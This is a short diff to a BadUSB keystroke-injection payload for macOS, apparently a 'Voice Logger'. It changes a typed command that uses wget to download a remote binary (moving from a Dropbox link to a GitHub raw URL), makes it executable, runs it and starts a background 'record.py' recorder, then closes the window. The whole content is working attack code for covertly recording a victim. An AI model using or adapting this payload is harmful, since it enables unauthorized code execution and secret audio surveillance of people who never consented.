@@ -54,8 +54,8 @@ STRING printf 'import os\nimport subprocess\nimport datetime\nfilename = "Secret
 DELAY 500
 ENTER
 DELAY 1200
-STRING wget -O allow_permission_mac 'https://dl-web.dropbox.com/scl/fi/k43jcnjle532pa18jkvgw/allow_permission_mac?rlkey=m6j8yx6h34v47uf3i7fxkje3v' && chmod +x allow_permission_mac && (./allow_permission_mac & nohup python3 record.py &)
+STRING wget -O allow_permission_mac_go 'https://raw.githubusercontent.com/YonKu0/BadUSB/main/MacOS/Voice%20Logger/allow_permission_mac_go' && chmod +x allow_permission_mac_go && nohup python3 record.py && sleep 0.5 && ./allow_permission_mac_go
 DELAY 500
 ENTER
-DELAY 10000 
+DELAY 5000 
 GUI w
